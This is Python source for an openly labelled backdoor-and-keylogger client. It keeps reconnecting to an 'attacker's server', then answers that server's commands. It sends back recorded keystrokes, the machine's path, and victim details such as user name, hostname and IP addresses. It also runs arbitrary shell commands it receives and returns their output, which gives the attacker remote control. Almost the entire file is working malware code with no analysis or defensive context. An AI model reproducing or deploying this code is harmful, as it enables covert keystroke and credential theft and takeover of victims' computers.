import keyboard
import threading
import time
import socket
import os
import subprocess

# import keylogger1



## connecter part

isConnected = False
HOST = '127.0.0.1'
port = 4321
print('initiating connection...')
cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


## this function keep trying to connect to the attacker's server until it succeeds
def connecter():
    global isConnected
    while not isConnected:
        try:
            print('waiting for server')
            cnx.connect((HOST, port))
            isConnected = True
            print('CONNECTION ESTABLISHED')
        except:
            time.sleep(5)

connecter()




## command interpreter part
## the server will communicate with the client by sending different commands
## 'get-keylog' command will send the what the keelogger has recorded
## 'get-file' command will send the path of the backdoor/keylogger

def commandInterpreter():
    while True:
        receivedCommand = cnx.recv(1024).decode()
        match receivedCommand:
            case 'get-keylog':
                keylogs = open('recorded.txt', 'r').read()
                cnx.sendall(keylogs.encode())
                print('keylog sent')    
                      
            case 'get-file':
                filePath = os.getcwd()
                cnx.sendall(filePath.encode())
                print('file path sent')

            case 'send-command':
                commandToExecute = cnx.recv(1024).decode()
                print('command received : ' + commandToExecute)
                result = subprocess.run(commandToExecute, shell=True, capture_output=True)
                if result.returncode == 0:
                    cnx.sendall(result.stdout)
                else:
                    print("result code is " + result.returncode + " => sending stderr")
                    cnx.sendall(result.stderr)
                print('command executed and sent')
            
            case 'get-info':
                victim_info = ''
                victim_info += 'os : ' + os.name + '\n'
                victim_info += 'user : ' + os.getlogin() + '\n'
                victim_info +=  'hostname : ' + socket.gethostname() + '\n'
                victim_info += 'local ip : ' + cnx.getsockname()[0] + '\n'
                victim_info += 'public ip : ' + socket.gethostbyname(socket.gethostname()) + '\n'

                cnx.sendall(victim_info.encode())
                print('victim info sent')

            case 'deconnecter':
                cnx.close()
                print('connection closed')
                exit()





threading.Thread(target=commandInterpreter).start()



import keylogger1
threading.Thread(target=keylogger1.recorderStarter).start()


# threading.Thread(target=worker).start()



